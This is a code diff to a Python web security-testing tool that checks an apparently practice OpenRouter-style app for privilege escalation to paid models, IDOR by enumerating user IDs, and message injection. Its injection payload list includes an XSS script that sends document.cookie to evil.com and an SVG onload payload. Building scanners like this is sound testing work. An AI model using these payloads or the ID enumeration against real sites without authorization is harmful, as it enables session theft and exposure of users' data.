@@ -1,4 +1,4 @@
-import sys, os, argparse, urllib.request, json
+import sys, os, argparse, urllib.request, urllib.parse, urllib.error, json
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from vibe_core import VibeTool
@@ -40,7 +40,8 @@ class BizLogic(VibeTool):
 
         # 2. Model privilege escalation — free user requesting paid model
         self.log("Test 2 — Model privilege escalation (free → paid model)...")
-        paid_models = ["anthropic/claude-opus-4-7","openai/gpt-4o","google/gemini-2.5-pro"]
+        # OpenRouter-style slugs (the bundled target is an OpenRouter front-end).
+        paid_models = ["anthropic/claude-sonnet-4.5", "openai/gpt-4o", "google/gemini-2.5-pro"]
         for model in paid_models:
             body = json.dumps({
                 "model": model,
@@ -78,8 +79,18 @@ class BizLogic(VibeTool):
             except Exception:
                 pass
 
-        # 4. Community message injection
-        self.log("Test 4 — Community message injection payloads...")
+        # 4. IDOR on user objects (the practice target maps this to biz_logic)
+        self.log("Test 4 — IDOR on /api/user ...")
+        for uid in ["1", "2", "3", "999999"]:
+            status, body, _ = self.safe_request(f"{base}/api/user?id={uid}", method="GET")
+            if status == 200 and body.strip() not in ("", "{}", "[]"):
+                self.log(f"[IDOR] id={uid} returned {body[:120]} without authorization", "fail")
+                hits += 1
+            else:
+                self.log(f"  [id={uid}] {status}: no user data returned")
+
+        # 5. Community message injection
+        self.log("Test 5 — Community message injection payloads...")
         for label, payload in [
             ("XSS script",      '<script>fetch("http://evil.com?c="+document.cookie)</script>'),
             ("SVG XSS",         '<svg/onload=alert(1)>'),
@@ -108,7 +119,6 @@ class BizLogic(VibeTool):
 
 
 if __name__ == "__main__":
-    import urllib.parse
     parser = argparse.ArgumentParser()
     parser.add_argument("--url", required=True)
     args = parser.parse_args()
